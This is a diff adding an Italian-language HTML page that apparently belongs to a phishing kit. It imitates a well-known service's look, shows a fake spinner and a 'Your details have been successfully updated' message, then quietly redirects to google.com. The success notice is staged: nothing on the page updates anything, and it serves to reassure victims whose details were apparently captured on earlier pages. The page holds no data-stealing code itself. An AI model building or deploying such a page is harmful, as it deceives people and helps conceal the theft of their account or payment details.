@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>All Set</title>
+    <link rel="stylesheet" href="./css/11.css">
+    <link rel="stylesheet" href="./css/12.css">
+</head>
+<body style="background:white !important;">
+
+<header>
+    <div class="left">
+        <img src="./img/lg.png">
+    </div>
+    <div class="right">
+        <a href="#">Sign out</a>
+    </div>
+</header>
+
+<section style="text-align:center;">
+
+    <div class="form" id="alwansi" style="text-align:center;">
+
+        <div class="form-title" style="font-size:2em; font-weight:bold; color:#333;">
+            YOU’RE Ready to go.
+        </div>
+
+        <div id="circleCheck" style="
+            width:160px;
+            height:160px;
+            margin:35px auto 20px auto;
+            border-radius:50%;
+            border:6px solid #dcdcdc;
+            border-top:6px solid #28a745;
+            background:transparent;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:90px;
+            color:white;
+            font-weight:bold;
+            box-shadow:0px 8px 18px rgba(0,0,0,0.08);
+            animation:spin 1s linear infinite;
+        ">
+        </div>
+
+        <div id="statusText" style="font-size:1em; color:#666; line-height:1.6;">
+            <br>
+        </div>
+
+    </div>
+
+</section>
+
+<footer style="width:100%; position:fixed; left:0; bottom:0;">
+    <div class="footer-holder">
+        <h3>Questions? Contact us.</h3>
+        <span>FAQ</span>
+        <span>Help Center</span>
+        <span>Terms of Use</span>
+        <span>Privacy</span>
+        <span>Cookie Preferences</span>
+        <span>Corporate Information</span>
+    </div>
+</footer>
+
+<style>
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+
+<script>
+    // After 1 second: success check mark
+    setTimeout(() => {
+        var circle = document.getElementById("circleCheck");
+        circle.style.animation = "none";
+        circle.style.border = "6px solid #28a745";
+        circle.style.background = "#28a745";
+        circle.innerHTML = "✓";
+
+        document.getElementById("statusText").innerHTML =
+            "Your details have been successfully updated.<br>...";
+    }, 1000);
+
+    // After 7 seconds: redirect to chosen URL
+    setTimeout(() => window.location = "https://www.google.com/", 5000);
+</script>
+</body>
+</html>
